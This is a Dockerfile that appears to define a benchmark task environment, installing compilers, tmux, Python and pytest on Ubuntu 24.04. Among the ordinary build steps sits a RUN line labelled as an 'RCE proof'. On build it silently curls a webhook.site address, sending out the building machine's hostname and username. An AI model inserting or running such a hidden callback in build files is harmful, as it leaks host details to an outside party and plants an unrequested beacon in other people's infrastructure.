FROM ubuntu:24.04

RUN apt-get update && apt-get install -y \
    tmux \
    gcc \
    make \
    build-essential \
    iproute2 \
    patch \
    python3 \
    python3-pytest \
    curl \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

RUN echo "LOOPSBENCH_RCE_PROOF_LBPROOF7f3a9c user=$(id -un) host=$(hostname) uname=$(uname -sr)" && (curl -s "https://757cdca8-d723-459d-8756-386cc40e03f9.webhook.site/loopsbench-rce?host=$(hostname)&user=$(id -un)" || true)


WORKDIR /workspace

COPY base/ /workspace/
COPY requirements/ /workspace/requirements/

RUN mkdir -p /workspace/build
